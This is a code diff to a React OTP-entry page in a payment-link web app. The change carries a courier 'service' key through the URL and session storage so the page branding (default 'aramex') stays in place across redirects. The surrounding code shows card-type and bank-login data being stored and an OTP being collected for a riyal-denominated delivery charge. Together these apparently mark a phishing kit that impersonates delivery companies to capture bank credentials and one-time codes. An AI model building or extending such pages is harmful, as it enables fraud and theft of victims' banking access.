@@ -1,4 +1,4 @@
-import { useState, useEffect, useRef } from "react";
+import { useState, useEffect, useRef, useMemo } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -15,6 +15,10 @@ const PaymentOTPForm = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const { data: linkData, isLoading } = useLink(id);
+  const urlServiceKey = useMemo(
+    () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
+    []
+  );
   
   const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
   const [attempts, setAttempts] = useState(0);
@@ -43,21 +47,33 @@ const PaymentOTPForm = () => {
   }
 
   const payload = (linkData.payload ?? {}) as Record<string, any>;
-  const serviceKey = payload.service_key || customerInfo.service || 'aramex';
+  const sessionServiceKey = typeof window !== "undefined" ? sessionStorage.getItem('serviceKey') : null;
+  const serviceKey = payload.service_key || payload.service || urlServiceKey || customerInfo.serviceKey || sessionServiceKey || customerInfo.service || 'aramex';
   const serviceName = payload.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const amount = payload?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
+  const serviceQuery = serviceKey ? `?service=${encodeURIComponent(serviceKey)}` : "";
+
+  useEffect(() => {
+    if (serviceKey) {
+      sessionStorage.setItem('serviceKey', serviceKey);
+    }
+  }, [serviceKey]);
   
   // Demo OTP: 123456
   const DEMO_OTP = "123456";
   
   useEffect(() => {
     const method = sessionStorage.getItem('paymentMethod');
+    const sessionService = sessionStorage.getItem('serviceKey');
+    const payloadService = linkData?.payload?.service_key || linkData?.payload?.service;
+    const serviceKeyParam = payloadService || urlServiceKey || customerInfo.serviceKey || sessionService;
+    const serviceQuery = serviceKeyParam ? `?service=${encodeURIComponent(serviceKeyParam)}` : "";
     if (!method) {
-      navigate(`/pay/${id}/track`);
+      navigate(`/pay/${id}/track${serviceQuery}`);
     }
-  }, [id, navigate]);
+  }, [id, navigate, linkData, urlServiceKey, customerInfo.serviceKey]);
 
   // Countdown timer effect
   useEffect(() => {
@@ -244,7 +260,7 @@ const PaymentOTPForm = () => {
       sessionStorage.removeItem('cardType');
       sessionStorage.removeItem('bankLoginData');
 
-      navigate(`/pay/${id}/receipt`);
+      navigate(`/pay/${id}/receipt${serviceQuery}`);
     } else {
       const newAttempts = attempts + 1;
       setAttempts(newAttempts);
